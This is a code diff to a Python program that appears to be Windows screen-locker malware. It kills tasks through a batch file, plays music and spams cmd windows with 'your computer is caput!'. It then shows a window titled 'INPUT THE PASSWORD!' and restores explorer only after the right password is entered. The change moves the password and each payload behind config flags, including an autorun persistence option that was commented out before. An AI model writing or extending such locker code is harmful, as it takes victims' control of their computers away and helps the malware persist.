@@ -9,6 +9,8 @@ from getpass import getuser
 from shutil import move
 import threading
 
+import config
+
 #v
 class M():
     def run_music():
@@ -22,7 +24,7 @@ class M():
         system("start system/kill.bat")
 
     def run_password():
-        if inp_pass.get() == "123321":
+        if inp_pass.get() == config.key:
             system("start explorer")
             exit()
         else:
@@ -56,11 +58,18 @@ class M():
 
 
 def init():
-    thread_taskKiller = threading.Thread(target=M.run_task_kill)
-    thread_taskKiller.start()
-    M.run_music()
-    #M.run_atr()
-    M.run_cmd(3, "echo your computer is caput!")
+    if config.start_thread:
+        thread_taskKiller = threading.Thread(target=M.run_task_kill)
+        thread_taskKiller.start()
+    
+    if config.run_music:
+        M.run_music()
+
+    if config.add_in_autorun:
+        M.run_atr()
+
+    if config.run_cmd:
+        M.run_cmd(config.cmd_count, config.cmd_command)
 init()
 
 def Quit():
@@ -70,7 +79,7 @@ root = tk.Tk()
 
 
 #setting title
-root.title("INPUT THE PASSWORD!")
+root.title(config.window_title)
 #setting window size
 width=800
 height=600
